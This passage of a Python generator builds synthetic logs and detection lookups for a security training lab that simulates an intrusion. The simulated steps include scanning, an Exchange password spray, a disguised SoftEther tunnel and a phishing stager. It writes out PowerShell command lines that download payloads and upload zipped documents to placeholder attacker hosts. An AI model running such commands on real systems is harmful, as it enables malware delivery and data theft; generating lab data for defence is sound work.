        targets = [u["ip"] for u in self.users] + list(self.servers.values())[:-1] + [f"10.20.2.{n}" for n in range(1, 80)]
        t = self.at(day, 1, 0)
        for i, ip in enumerate(targets):
            for port in (21, 22, 53, 80, 443, 445, 3389):
                self.fw_flow(t + dt.timedelta(seconds=i * 36 + port % 7), VULN_SCANNER, ip, port,
                             action="allowed" if port in (445, 3389) else "blocked", dvc="fw-core01")

    def internet_scan(self, day):
        t = self.at(day, 5 if day > 0 else 14, 10)
        for i, ip in enumerate(self.rng.sample(self.public_hosts, 30)):
            for port in (22, 443):
                self.fw_flow(t + dt.timedelta(seconds=i * 20 + port % 5), NET_SCANNER, ip, port,
                             action="allowed" if (ip in (MAIL_PUBLIC, WEB_PUBLIC) and port == 443) else "blocked")

    def service_noise(self):
        self.win_event("System", "WS-0433", self.at(-6, 11, 2, 7), 7045, {
            "ServiceName": "Lenovo Vantage Service", "ImagePath": "C:\\ProgramData\\Lenovo\\Vantage\\Addins\\LenovoVantageService.exe",
            "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"})
        for d in (-12, -5, 2, 8):
            for ws in self.rng.sample(self.users, 6):
                self.win_event("System", ws["ws"], self.at(d, 12, self.rng.randint(0, 59)), 7045, {
                    "ServiceName": "Microsoft Edge Update Service (edgeupdate)",
                    "ImagePath": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /svc",
                    "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"})

    def o365_background(self):
        rng = self.rng
        for day, date in self.days():
            weekday = date.weekday() < 5
            for u in self.audited:
                if weekday:
                    for _ in range(rng.randint(3, 8)):
                        t = self.at(day, rng.randint(8, 17), rng.randint(0, 59), rng.uniform(0, 59))
                        app = rng.choice([OFFICE_APP_ID, OFFICE_APP_ID, OUTLOOK_MOBILE_APP_ID])
                        self.o365_record(t, self.mail_access(u["upn"], u["upn"], app, u["ip"] if app == OFFICE_APP_ID else MOBILE_GW,
                                                             rng.randint(1, 12)))
            t = self.at(day, 1, 30)
            for k, u in enumerate(self.audited):
                self.o365_record(t + dt.timedelta(seconds=k * 9), self.mail_access(f"ServicePrincipal_{BACKUP_APP_ID}", u["upn"],
                                                                                  BACKUP_APP_ID, "20.190.151.6", rng.randint(20, 300)))

    def mail_access(self, user_id, owner, app_id, ip, count):
        return {"RecordType": 50, "Operation": "MailItemsAccessed", "ResultStatus": "Succeeded",
                "UserKey": user_id, "UserType": 0 if "@" in user_id else 5, "Version": 1, "Workload": "Exchange",
                "ClientIPAddress": ip, "UserId": user_id, "AppId": app_id, "ClientAppId": app_id,
                "ExternalAccess": False, "LogonType": 0, "MailboxGuid": str(uuid.uuid5(uuid.NAMESPACE_DNS, owner)),
                "MailboxOwnerUPN": owner, "OperationCount": count,
                "OperationProperties": [{"Name": "MailAccessType", "Value": "Bind" if app_id == ROGUE_APP_ID else "Sync"},
                                        {"Name": "IsThrottled", "Value": "False"}]}

    def web_server_files(self):
        self.sysmon_file("WEB01", self.at(-12, 14, 5, 3), "C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe",
                         "C:\\inetpub\\wwwroot\\assets\\Css.js", "LAB\\svc-deploy")
        self.sysmon_file("WEB01", self.at(-12, 14, 5, 4), "C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe",
                         "C:\\inetpub\\wwwroot\\css\\site.css", "LAB\\svc-deploy")

    # ------------------------------------------------------------------ the intrusion
    def intrusion(self):
        rng = self.rng
        # Day 0 09:12 - external scan of 41 public hosts on the advisory's ports
        targets = [MAIL_PUBLIC, WEB_PUBLIC] + rng.sample([h for h in self.public_hosts if h not in (MAIL_PUBLIC, WEB_PUBLIC)], 39)
        self.scan_targets = targets
        t = self.at(0, 9, 12, 3)
        for i, ip in enumerate(targets):
            for j, port in enumerate((21, 22, 53, 80, 443, 1080)):
                ok = ip in (MAIL_PUBLIC, WEB_PUBLIC) and port in (80, 443)
                self.fw_flow(t + dt.timedelta(seconds=i * 38 + j * 2.5), ATTACKER_SCAN, ip, port, action="allowed" if ok else "blocked")
        # Day 0 09:20 - dirsearch-style enumeration of the public website
        words = list(DIRSEARCH_WORDS)
        paths = sorted({f"/{a}{b}{ext}" for a in words for b in ("", "_old", "2") for ext in (".php", ".aspx", ".asp")})
        rng.shuffle(paths)
        paths = paths[:450]
        t = self.at(0, 9, 20, 5)
        dir_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        for i, p in enumerate(paths):
            self.iis_line("WEB01", t + dt.timedelta(seconds=i * 0.6), "GET", p, None, ATTACKER_SCAN, dir_ua, 404, win32=2)
        self.iis_line("WEB01", t + dt.timedelta(seconds=275), "GET", "/login.aspx", None, ATTACKER_SCAN, dir_ua, 200)
        # Day 0 11:40 - EBurst-style spray: 64 mailboxes, 1-2 tries each, four Exchange interfaces
        victims = [self.by_sam[VICTIM]] + rng.sample([u for u in self.users if u["sam"] != VICTIM], 63)
        rng.shuffle(victims)
        attempts = []
        for u in victims:
            for _ in range(1 if u["sam"] == VICTIM else rng.choice([1, 2, 2])):
                attempts.append(u)
        rng.shuffle(attempts)
        t0, span = self.at(0, 11, 40, 2), 17 * 60
        self.fw_flow(t0, ATTACKER_SCAN, MAIL_PUBLIC, 443, bytes_in=2_400_000, bytes_out=310_000, duration=1100)
        for i, u in enumerate(attempts):
            stem, method, ua = SPRAY_IFACES[i % 4]
            tt = t0 + dt.timedelta(seconds=i * span / len(attempts))
            self.iis_line("MAIL01", tt, method, stem, u["sam"], ATTACKER_SCAN, ua, 401, sub=1, win32=1326)
            self.win_event("Security", "MAIL01", tt, 4625, self.fail_data(u["sam"], ATTACKER_SCAN))
        # Day 0 11:58 - j.citizen succeeds over EWS, then browses the mailbox
        v = self.by_sam[VICTIM]
        ts = self.at(0, 11, 58, 7)
        self.iis_line("MAIL01", ts, "POST", "/EWS/Exchange.asmx", VICTIM, ATTACKER_SCAN, SPRAY_IFACES[0][2], 200)
        logon = self.logon_data(v, 8, ATTACKER_SCAN, "MAIL01")
        logon.update({"SubjectUserName": "MAIL01$", "LogonProcessName": "Advapi  ", "WorkstationName": "MAIL01",
                      "ProcessName": "C:\\Windows\\System32\\inetsrv\\w3wp.exe"})
        self.win_event("Security", "MAIL01", ts, 4624, logon)
        for k in range(34):
            self.iis_line("MAIL01", ts + dt.timedelta(seconds=20 + k * 38), "POST", "/EWS/Exchange.asmx", VICTIM, ATTACKER_SCAN,
                          SPRAY_IFACES[0][2], 200)
        # Day 0 15:20 - lure from the mailbox: fake login page drops live700_v1.exe, which drops DiagTrack.exe
        user = f"{NETBIOS}\\{VICTIM}"
        tl = self.at(0, 15, 20, 11)
        dl = f"C:\\Users\\{VICTIM}\\Downloads\\live700_v1.exe"
        self.sysmon_file(VICTIM_WS, tl, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", dl, user)
        self.sysmon_proc(VICTIM_WS, tl + dt.timedelta(seconds=19), dl, f'"{dl}"', user, "C:\\Windows\\explorer.exe",
                         "C:\\Windows\\Explorer.EXE", "live700_v1.exe", company="", product="", description="")
        diag = "C:\\Users\\Public\\Libraries\\DiagTrack.exe"
        self.sysmon_file(VICTIM_WS, tl + dt.timedelta(seconds=21), dl, diag, user)
        self.sysmon_proc(VICTIM_WS, tl + dt.timedelta(seconds=23), diag, f'"{diag}" -s', user, dl, f'"{dl}"', "DiagTrack.exe",
                         company="", product="", description="")
        tb = tl + dt.timedelta(seconds=30)
        while tb < self.end.astimezone(UTC):
            self.dns_query(tb, VICTIM_IP, STAGE_C2, SOFTETHER_SERVER)
            tb += dt.timedelta(minutes=rng.choice([55, 60, 65]))
        # Day 1 02:10 - SoftEther fetched under a decoy name, renamed to conhost.exe, installed as an autostart service
        tp = self.at(1, 2, 10, 51)
        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        self.sysmon_proc(VICTIM_WS, tp, ps,
                         f"powershell.exe -nop -w hidden -c \"iwr http://{SOFTETHER_SERVER}/001.gif -OutFile C:\\ProgramData\\USOShared\\001.gif;"
                         f" iwr http://{SOFTETHER_SERVER}/Include.png -OutFile C:\\ProgramData\\USOShared\\Include.png\"",
                         user, diag, f'"{diag}" -s', "PowerShell.EXE", description="Windows PowerShell")
        self.fw_flow(tp + dt.timedelta(seconds=4), VICTIM_IP, SOFTETHER_SERVER, 80, bytes_in=4_812_000, bytes_out=1_900)
        self.sysmon_file(VICTIM_WS, tp + dt.timedelta(seconds=11), ps, "C:\\ProgramData\\USOShared\\001.gif", user)
        self.sysmon_file(VICTIM_WS, tp + dt.timedelta(seconds=49), ps, "C:\\ProgramData\\USOShared\\Include.png", user)
        self.sysmon_proc(VICTIM_WS, tp + dt.timedelta(seconds=98), "C:\\Windows\\System32\\cmd.exe",
                         "cmd.exe /c copy /y C:\\ProgramData\\USOShared\\001.gif C:\\ProgramData\\USOShared\\conhost.exe",
                         user, ps, "powershell.exe -nop -w hidden", "Cmd.Exe", description="Windows Command Processor")
        self.sysmon_file(VICTIM_WS, tp + dt.timedelta(seconds=99), "C:\\Windows\\System32\\cmd.exe",
                         "C:\\ProgramData\\USOShared\\conhost.exe", user)
        self.win_event("System", VICTIM_WS, self.at(1, 2, 13, 41), 7045, {
            "ServiceName": "Console Host Service", "ImagePath": "C:\\ProgramData\\USOShared\\conhost.exe /service",
            "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"}, user_sid=v["sid"])
        softether = dict(company="SoftEther VPN Project", product="SoftEther VPN", description="SoftEther VPN Bridge",
                         integrity="System")
        for when in (self.at(1, 2, 14, 2), self.at(2, 7, 58, 31)):
            self.sysmon_proc(VICTIM_WS, when, "C:\\ProgramData\\USOShared\\conhost.exe",
                             "\"C:\\ProgramData\\USOShared\\conhost.exe\" /service", "NT AUTHORITY\\SYSTEM",
                             "C:\\Windows\\System32\\services.exe", "C:\\Windows\\system32\\services.exe", "vpnbridge.exe", **softether)
            self.dns_query(when + dt.timedelta(seconds=3), VICTIM_IP, SOFTETHER_DDNS, SOFTETHER_SERVER)
            self.win_event("Sysmon", VICTIM_WS, when + dt.timedelta(seconds=18), 3, {
                "RuleName": "-", "UtcTime": (when + dt.timedelta(seconds=18)).strftime("%Y-%m-%d %H:%M:%S.000"),
                "ProcessGuid": self.proc_guid(), "ProcessId": 6644, "Image": "C:\\ProgramData\\USOShared\\conhost.exe",
                "User": "NT AUTHORITY\\SYSTEM", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false",
                "SourceIp": VICTIM_IP, "SourceHostname": f"{VICTIM_WS}.{DOMAIN}", "SourcePort": 50122, "SourcePortName": "-",
                "DestinationIsIpv6": "false", "DestinationIp": SOFTETHER_SERVER, "DestinationHostname": SOFTETHER_DDNS,
                "DestinationPort": 443, "DestinationPortName": "https"})
        # SoftEther keeps the tunnel up: hourly interim flow records, with two bulk pulls through it
        th = self.at(1, 2, 15, 0)
        bulk = {(1, 3), (1, 4), (2, 23), (3, 0), (3, 1)}
        while th < self.end.astimezone(UTC):
            local = th.astimezone(self.tz)
            dday = (local.date() - self.day0).days
            if (dday, local.hour) in bulk:
                out, inn = rng.randint(220_000_000, 270_000_000), rng.randint(2_000_000, 4_000_000)
            else:
                out, inn = rng.randint(800_000, 2_500_000), rng.randint(300_000, 900_000)
            self.fw_flow(th, VICTIM_IP, SOFTETHER_SERVER, 443, bytes_in=inn, bytes_out=out, duration=3600, app="ssl")
            if local.minute < 5 or rng.random() < 0.1:
                self.dns_query(th + dt.timedelta(seconds=rng.randint(1, 50)), VICTIM_IP, SOFTETHER_DDNS, SOFTETHER_SERVER)
            th += dt.timedelta(hours=1)
        # Day 2 22:10 - a secret is added to an app j.citizen owns that holds Mail.Read (office-cli style access)
        self.o365_record(self.at(2, 22, 10, 37), {
            "RecordType": 8, "Operation": "Add service principal credentials.", "ResultStatus": "Success",
            "UserKey": v["upn"], "UserType": 0, "Version": 1, "Workload": "AzureActiveDirectory", "UserId": v["upn"],
            "ObjectId": ROGUE_APP_ID, "ActorIpAddress": ATTACKER_COLLECT, "ClientIP": ATTACKER_COLLECT,
            "Target": [{"ID": ROGUE_APP_ID, "Type": 2}, {"ID": ROGUE_APP_NAME, "Type": 1}],
            "ModifiedProperties": [{"Name": "KeyDescription", "NewValue": "[KeyIdentifier=3f0c..., KeyType=Password, KeyUsage=Verify, DisplayName=sync]", "OldValue": "[]"}]})
        # Day 3 03:05-03:58 - 2,400 EWS calls as j.citizen from a new address, scripted client, no user agent
        tc = self.at(3, 3, 5, 0)
        self.fw_flow(tc, ATTACKER_COLLECT, MAIL_PUBLIC, 443, bytes_in=640_000_000, bytes_out=9_800_000, duration=3200)
        for k in range(2400):
            self.iis_line("MAIL01", tc + dt.timedelta(seconds=k * 3180 / 2400), "POST", "/EWS/Exchange.asmx", VICTIM,
                          ATTACKER_COLLECT, "-", 200)
        # Day 4 01:00 - the app reads seven audited mailboxes from the same address
        tm = self.at(4, 1, 0, 12)
        for k, u in enumerate([v] + rng.sample(self.audited[1:], 6)):
            self.o365_record(tm + dt.timedelta(seconds=k * 41), self.mail_access(f"ServicePrincipal_{ROGUE_APP_ID}", u["upn"],
                                                                                ROGUE_APP_ID, ATTACKER_COLLECT, rng.randint(180, 900)))
        self.fishhub()

    def fishhub(self):
        # Day 2 10:41 - a researcher opens a spear-phish; the FishHub stager runs, lists and zips documents, uploads them
        user = f"{NETBIOS}\\{FISH_USER}"
        temp = f"C:\\Users\\{FISH_USER}\\AppData\\Local\\Temp"
        outlook = "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ws = "C:\\Windows\\System32\\wscript.exe"
        vbe = f"{temp}\\{FISHHUB_STEM}.vbe"
        t = self.at(2, 10, 41, 7)
        self.sysmon_proc(FISH_WS, t, ps,
                         f"powershell.exe -w hidden -c \"(New-Object Net.WebClient).DownloadFile('https://{FISHHUB_HOST}/d{FISHHUB_STEM}/"
                         f"{FISHHUB_STEM}.txt','%temp%\\{FISHHUB_STEM}.vbe')\"",
                         user, outlook, f'"{outlook}"', "PowerShell.EXE", description="Windows PowerShell")
        self.dns_query(t + dt.timedelta(seconds=1), FISH_IP, FISHHUB_HOST, FISHHUB_DL)
        self.fw_flow(t + dt.timedelta(seconds=2), FISH_IP, FISHHUB_DL, 443, bytes_in=38_400, bytes_out=2_100)
        self.sysmon_file(FISH_WS, t + dt.timedelta(seconds=3), ps, vbe, user)
        self.sysmon_proc(FISH_WS, t + dt.timedelta(seconds=5), ws, f'"{ws}" "{vbe}"', user, ps, "powershell.exe -w hidden",
                         "wscript.exe", description="Microsoft ® Windows Based Script Host")
        self.sysmon_proc(FISH_WS, t + dt.timedelta(seconds=9), "C:\\Windows\\System32\\cmd.exe",
                         f"cmd.exe /c dir /s /b C:\\Users\\{FISH_USER}\\Documents\\*.docx C:\\Users\\{FISH_USER}\\Documents\\*.pdf > {temp}\\fl.tmp",
                         user, ws, f'"{ws}" "{vbe}"', "Cmd.Exe", description="Windows Command Processor")
        self.sysmon_file(FISH_WS, t + dt.timedelta(seconds=11), "C:\\Windows\\System32\\cmd.exe", f"{temp}\\fl.tmp", user)
        self.sysmon_proc(FISH_WS, t + dt.timedelta(seconds=14), ps,
                         f"powershell.exe -w hidden -c \"Compress-Archive -Path (Get-Content $env:TEMP\\fl.tmp) -DestinationPath $env:TEMP\\~dfa31.zip\"",
                         user, ws, f'"{ws}" "{vbe}"', "PowerShell.EXE", description="Windows PowerShell")
        self.sysmon_file(FISH_WS, t + dt.timedelta(seconds=52), ps, f"{temp}\\~dfa31.zip", user)
        self.sysmon_proc(FISH_WS, t + dt.timedelta(seconds=58), ps,
                         f"powershell.exe -w hidden -c \"Invoke-WebRequest -Uri https://{FISHHUB_EXFIL}/u -Method Post -InFile $env:TEMP\\~dfa31.zip\"",
                         user, ws, f'"{ws}" "{vbe}"', "PowerShell.EXE", description="Windows PowerShell")
        self.fw_flow(t + dt.timedelta(seconds=59), FISH_IP, FISHHUB_EXFIL, 443, bytes_in=41_000, bytes_out=186_000_000, duration=240)

    def legit_softether(self):
        # v2: an approved SoftEther VPN Client on an IT admin's workstation, the false positive the tuning step removes.
        # Uses its own RNG and writes to win_extra so the v1 data files are unchanged.
        saved_rng, self.rng = self.rng, random.Random(LEGIT_VPN_SEED)
        self.win_sink = self.win_extra
        u = self.users[LEGIT_VPN_INDEX]
        client = "C:\\Program Files\\SoftEther VPN Client\\vpnclient_x64.exe"
        manager = "C:\\Program Files\\SoftEther VPN Client\\vpncmgr_x64.exe"
        vendor = dict(company="SoftEther VPN Project", product="SoftEther VPN", integrity="System")
        self.win_event("System", u["ws"], self.at(-10, 10, 5, 12), 7045, {
            "ServiceName": "SoftEther VPN Client", "ImagePath": f'"{client}" /service',
            "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"}, user_sid=u["sid"])
        for day, date in self.days():
            if day < -10 or date.weekday() >= 5:
                continue
            t = self.at(day, 7, self.rng.randint(40, 59), self.rng.uniform(0, 59))
            self.sysmon_proc(u["ws"], t, client, f'"{client}" /service', "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\services.exe",
                             "C:\\Windows\\system32\\services.exe", "vpnclient_x64.exe", description="SoftEther VPN Client", **vendor)
            if self.rng.random() < 0.6:
                self.sysmon_proc(u["ws"], t + dt.timedelta(minutes=self.rng.randint(20, 90)), manager, f'"{manager}"',
                                 f"{NETBIOS}\\{u['sam']}", "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", "vpncmgr_x64.exe",
                                 description="SoftEther VPN Client Manager", company="SoftEther VPN Project", product="SoftEther VPN")
        self.win_sink, self.rng = self.win, saved_rng

    def exploitation(self):
        # v3: exploit attempts for the advisory's CVEs and XSS payloads, in a separate web log with its own RNG so the v1/v2
        # files stay byte-identical. The actor tries them all against the public website between the scan and the spray;
        # an internet scanner tries one, twice; the approved internal scanner checks a few every Sunday.
        saved_rng, self.rng = self.rng, random.Random(EXPLOIT_SEED)
        self.iis_sink = self.iis_extra

        def send(t, src, probes, ua):
            for k, (method, stem, query, probe_ua, status) in enumerate(probes):
                self.iis_line("WEB01", t + dt.timedelta(seconds=k * self.rng.uniform(6, 14)), method, stem, None, src,
                              probe_ua or ua, status, query=query, win32=2 if status == 404 else 0)

        send(self.at(0, 9, 41, 10), ATTACKER_SCAN, ACTOR_PROBES, PROBE_UA)
        for day in (-9, 5):
            send(self.at(day, 5 if day > 0 else 14, 22, 40), NET_SCANNER, ACTOR_PROBES[:1], PROBE_UA)
        for day, date in self.days():
            if date.weekday() == 6:
                send(self.at(day, 1, 40), VULN_SCANNER, SCANNER_PROBES, SCANNER_UA)
        self.iis_sink, self.rng = self.iis, saved_rng

    def write_context_lookups(self):
        lk = APP / "lookups"
        u_by_ws = {u["ws"]: u for u in self.users}
        assets = [{"host": u["ws"], "ip": u["ip"], "public_ip": "", "category": "workstation", "owner": u["sam"],
                   "priority": "high" if u["sam"] in (VICTIM, FISH_USER) else "medium", "internet_facing": "no"} for u in self.users]
        for host, ip in self.servers.items():
            public = {"MAIL01": MAIL_PUBLIC, "WEB01": WEB_PUBLIC}.get(host, "")
            assets.append({"host": host, "ip": ip, "public_ip": public,
                           "category": "domain_controller" if host.startswith("DC") else "server", "owner": "ICT Operations",
                           "priority": "critical" if host.startswith(("DC", "MAIL")) else "high", "internet_facing": "yes" if public else "no"})
        with (lk / "aa26_lab_assets.csv").open("w", newline="") as f:
            w = csv.DictWriter(f, list(assets[0]), lineterminator="\n")
            w.writeheader()
            w.writerows(assets)
        depts = ["Capability Division", "Estate and Infrastructure", "Joint Logistics", "ICT Operations", "Strategic Policy",
                 "Science and Technology", "People Services", "Finance"]
        ids = []
        for i, u in enumerate(self.users):
            title, dept, prio = "Staff officer", depts[i % len(depts)], "medium"
            if u["sam"] == VICTIM:
                title, dept, prio = "Senior executive assistant", "Executive Office", "high"
            elif u["sam"] == FISH_USER:
                title, dept, prio = "Research Scientist, University Partnerships", "Science and Technology", "high"
            elif i == LEGIT_VPN_INDEX:
                title, dept = "Network Administrator", "ICT Operations"
            ids.append({"identity": u["sam"], "display": u["display"], "title": title, "department": dept, "workstation": u["ws"],
                        "office_ip": u["ip"], "home_ip": u["home"] or "", "mobile_ip": MOBILE_GW if u["mobile"] else "", "priority": prio})
        with (lk / "aa26_lab_identities.csv").open("w", newline="") as f:
            w = csv.DictWriter(f, list(ids[0]), lineterminator="\n")
            w.writeheader()
            w.writerows(ids)
        scanned = {r["dest"] for r in self.fw if r["dest_port"] in (21, 22, 53, 80, 443, 1080) and not r["src"].startswith("10.")}
        unscanned = [h for h in self.public_hosts if h not in scanned and h not in (MAIL_PUBLIC, WEB_PUBLIC)]
        vulns = [("VPN01", self.scan_targets[2], "Pulse Connect Secure 9.0R3", "CVE-2019-11510", "yes", "critical"),
                 ("FTP01", self.scan_targets[3], "ProFTPD 1.3.5", "CVE-2015-3306", "yes", "medium"),
                 ("NS01", unscanned[0], "ISC BIND 9.9.7", "CVE-2015-5477", "yes", "high"),
                 ("GIT01", "", "GitLab CE 13.10.2", "CVE-2021-22205", "no", "high"),
                 ("LEGACY01", "", "GNU Bash 4.3 (patch 26)", "CVE-2014-6278", "no", "medium")]
        with (lk / "aa26_lab_vulns.csv").open("w", newline="") as f:
            w = csv.writer(f, lineterminator="\n")
            w.writerow(["host", "public_ip", "product", "cve", "internet_facing", "criticality"])
            w.writerows(vulns)
        legit = self.users[LEGIT_VPN_INDEX]
        with (lk / "aa26_approved_remote_access.csv").open("w", newline="") as f:
            w = csv.writer(f, lineterminator="\n")
            w.writerow(["dest", "process_path", "product", "approved_by", "review_date"])
            w.writerow([legit["ws"], "C:\\Program Files\\SoftEther VPN Client\\vpnclient_x64.exe", "SoftEther VPN Client",
                        "ICT change CHG-2291", "2027-03-31"])
        self.vulns = vulns
        with (lk / "aa26_advisory_cves.csv").open("w", newline="") as f:
            w = csv.writer(f, lineterminator="\n")
            w.writerow(["cve", "year", "product", "weakness", "impact", "kev_added_with_advisory"])
            w.writerows(ADVISORY_CVES)

    def seed_risk(self):
        def add(day, hh, mm, ss, name, objects, technique, tactic_id, tactic, message, threat):
            t = self.at(day, hh, mm, ss)
            for obj, otype, score in objects:
                self.risk.append({"t": t, "source": name, "risk_object": obj, "risk_object_type": otype, "risk_score": score,
                                  "technique": technique, "tactic_id": tactic_id, "tactic": tactic,
                                  "risk_message": message, "threat_object": threat[0], "threat_object_type": threat[1]})
        add(0, 9, 12, 3, "AA26-281A - Scanning on advisory ports - Rule",
            [(ATTACKER_SCAN, "system", 10), (VICTIM, "user", 10)], "T1595.002", "TA0043", "reconnaissance",
            f"{ATTACKER_SCAN} scanned 41 hosts on the AA26-281A ports; the same source later authenticated as {VICTIM}",
            (ATTACKER_SCAN, "ip_address"))
        add(0, 9, 41, 10, "AA26-281A - Exploit attempts for advisory CVEs - Rule",
            [(ATTACKER_SCAN, "system", 20)], "T1190", "TA0001", "initial-access",
            f"{ATTACKER_SCAN} tried 6 of the advisory's CVEs and XSS payloads against WEB01", (ATTACKER_SCAN, "ip_address"))
        add(0, 11, 40, 2, "AA26-281A - Exchange password spray - Rule",
            [(ATTACKER_SCAN, "system", 20), (VICTIM, "user", 20)], "T1110.003", "TA0006", "credential-access",
            f"{ATTACKER_SCAN} sprayed 64 mailboxes across 4 Exchange interfaces", (ATTACKER_SCAN, "ip_address"))
        add(0, 11, 58, 7, "AA26-281A - Spray source authenticated - Rule",
            [(ATTACKER_SCAN, "system", 40), (VICTIM, "user", 40)], "T1078", "TA0001", "initial-access",
            f"{VICTIM} authenticated over EWS from spray source {ATTACKER_SCAN}", (ATTACKER_SCAN, "ip_address"))
        add(1, 2, 14, 2, "AA26-281A - SoftEther masquerading as Windows binary - Rule",
            [(VICTIM_WS, "system", 60), (VICTIM, "user", 60)], "T1133", "TA0003", "persistence",
            f"conhost.exe on {VICTIM_WS} has OriginalFileName vpnbridge.exe and runs as an autostart service; {VICTIM_WS} is assigned to {VICTIM}",
            ("C:\\ProgramData\\USOShared\\conhost.exe", "process"))
        add(1, 2, 15, 0, "AA26-281A - SoftEther dynamic DNS - Rule",
            [(VICTIM_WS, "system", 20), (VICTIM, "user", 20)], "T1572", "TA0011", "command-and-control",
            f"{VICTIM_WS} resolved {SOFTETHER_DDNS} and holds a tunnel to {SOFTETHER_SERVER}:443", (SOFTETHER_DDNS, "domain"))
        add(3, 3, 30, 0, "AA26-281A - EWS volume far above normal - Rule",
            [(VICTIM, "user", 50)], "T1114.002", "TA0009", "collection",
            f"2,400 EWS calls as {VICTIM} in one hour from {ATTACKER_COLLECT} with no user agent", (ATTACKER_COLLECT, "ip_address"))
        add(2, 10, 41, 12, "AA26-281A - FishHub-style script stager - Rule",
            [(FISH_WS, "system", 40), (FISH_USER, "user", 40)], "T1059.005", "TA0002", "execution",
            f"PowerShell started from Outlook on {FISH_WS} downloaded a .vbe into %temp% and wscript.exe ran it; {FISH_WS} is assigned to {FISH_USER}",
            (f"{FISHHUB_STEM}.vbe", "file_name"))
        add(2, 10, 41, 8, "AA26-281A - Known-bad domain resolved - Rule",
            [(FISH_USER, "user", 30)], "T1105", "TA0011", "command-and-control",
            f"{FISH_WS} ({FISH_USER}) resolved {FISHHUB_HOST}, a FishHub domain seized by the FBI on 8 Oct 2026", (FISHHUB_HOST, "domain"))
        add(2, 10, 42, 6, "AA26-281A - Connection to known-bad IP - Rule",
            [(FISH_USER, "user", 30)], "T1041", "TA0010", "exfiltration",
            f"{FISH_WS} ({FISH_USER}) uploaded 186 MB to {FISHHUB_EXFIL}, the FishHub collection server named in the seizure affidavit",
            (FISHHUB_EXFIL, "ip_address"))

    # ------------------------------------------------------------------ output
    def write(self, out):
        for d in (out, APP / "data"):
            if d.exists():
                shutil.rmtree(d)
        out.mkdir(parents=True)
        data = APP / "data"
        data.mkdir(parents=True)
        manifest = []

        fields = ["date", "time", "s-ip", "cs-method", "cs-uri-stem", "cs-uri-query", "s-port", "cs-username", "c-ip",
                  "cs(User-Agent)", "cs(Referer)", "sc-status", "sc-substatus", "sc-win32-status", "time-taken"]
        for server, index, store, suffix in (("MAIL01", "exchange", self.iis, ""), ("WEB01", "web", self.iis, ""),
                                             ("WEB01", "web", self.iis_extra, "_v3")):
            rows = sorted(store[server], key=lambda r: r["t"])
            p = data / f"iis_{server.lower()}{suffix}.log"
            with p.open("w", newline="\r\n") as f:
                f.write(f"#Software: Microsoft Internet Information Services 10.0\n#Version: 1.0\n"
                        f"#Date: {rows[0]['t']:%Y-%m-%d %H:%M:%S}\n#Fields: {' '.join(fields)}\n")
                for r in rows:
                    f.write(f"{r['t']:%Y-%m-%d} {r['t']:%H:%M:%S} {r['s_ip']} {r['cs_method']} {r['cs_uri_stem']} "
                            f"{r['cs_uri_query']} {r['s_port']} {r['cs_username']} {r['c_ip']} {r['cs_User_Agent']} - "
                            f"{r['sc_status']} {r['sc_substatus']} {r['sc_win32_status']} {r['time_taken']}\n")
            manifest.append({"file": f"data/{p.name}", "index": index, "sourcetype": "ms:iis:auto",
                             "source": f"C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex{server.lower()}{suffix}.log", "host": server,
                             "events": len(rows)})

        for name, rows, index, st, host in (("firewall", self.fw, "firewall", "lab:firewall", "fw-edge01"),
                                            ("dns", self.dns, "dns", "lab:dns", "DC01")):
            rows.sort(key=lambda r: r["t"])
            p = data / f"{name}.log"
            with p.open("w") as f:
                for r in rows:
                    kv = " ".join(f"{k}={v}" for k, v in r.items() if k != "t")
                    f.write(f"{r['t']:%Y-%m-%dT%H:%M:%S}.{r['t'].microsecond // 1000:03d}Z {kv}\n")
            manifest.append({"file": f"data/{p.name}", "index": index, "sourcetype": st, "source": f"lab:{name}",
                             "host": host, "events": len(rows)})

        self.o365.sort(key=lambda r: r["t"])
        p = data / "o365_management_activity.json"
        with p.open("w") as f:
            for r in self.o365:
                rec = {k: v for k, v in r.items() if k != "t"}
                f.write(json.dumps({"CreationTime": rec.pop("CreationTime"), **rec}) + "\n")
        manifest.append({"file": f"data/{p.name}", "index": "o365", "sourcetype": "o365:management:activity",
                         "source": f"{TENANT_ID}:Audit.General", "host": "lab-o365", "events": len(self.o365)})

        sources = {"Security": ("wineventlog", "XmlWinEventLog:Security"), "System": ("wineventlog", "XmlWinEventLog:System"),
                   "Sysmon": ("sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational")}
        for suffix, store in (("", self.win), ("_v2", self.win_extra)):
            self._write_windows(store, suffix, data, sources, manifest)

        (out / "manifest.json").write_text(json.dumps({
            "window": {"earliest": int(self.start.timestamp()), "latest": int(self.end.timestamp()),
                       "earliest_local": self.start.isoformat(), "latest_local": self.end.isoformat()},
            "files": manifest}, indent=2))
        self.write_seed(out / "seed_risk.spl")
        return manifest

    def _write_windows(self, store, suffix, data, sources, manifest):
        grouped = defaultdict(list)
        for (channel, host), evs in store.items():
            grouped[channel].extend(evs)
        for channel, evs in grouped.items():
            evs.sort(key=lambda e: e[0])
            p = data / f"windows_{channel.lower()}{suffix}.xml"
            with p.open("w") as f:
                for _, xml in evs:
                    f.write(xml + "\n")
            index, source = sources[channel]
            manifest.append({"file": f"data/{p.name}", "index": index, "sourcetype": "XmlWinEventLog",
                             "source": source, "host": "lab-wef01", "events": len(evs)})

    def write_seed(self, path):
        by_source = defaultdict(list)
        for r in self.risk:
            by_source[r["source"]].append(r)
        lines = []
        for source, rows in by_source.items():
            parts = []
